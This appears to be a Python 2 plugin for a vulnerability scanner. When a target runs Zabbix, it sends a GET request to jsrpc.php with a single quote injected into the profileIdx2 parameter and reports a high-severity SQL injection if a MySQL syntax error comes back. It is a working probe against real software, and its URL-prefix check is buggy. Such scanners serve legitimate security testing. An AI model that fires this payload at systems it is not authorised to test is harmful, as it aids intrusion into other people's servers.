#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from config import *
import base64

def check(site, _dir, app, lang):
    if 'zabbix' in app.split(','):
        return True
    return False

def verify(ip, port=80, name='', timeout=10, types='ip'):

    if types == 'ip':
        url = ip + ':' + str(port)
    else:
        url = ip
    if not url.startswith('http:/') or not url.startswith('https:/'):
        url = 'http://' + url

    try:
        
        payload = '/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1%27&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17'
        url = url.rstrip('/') + payload
        code, head, html = http_request_get(url)
        if 'You have an error in your SQL syntax' in html:
            details = 'Zabbix jsrpc.php SQLI: %s' % (url)
            # target = site + 
            info = {
                'url': url,
                'severity': 'high',
                'vuln_name': 'zabbix jsrpc sqli',
                'proof': details
            }
            return info
    except Exception, e:
        pass
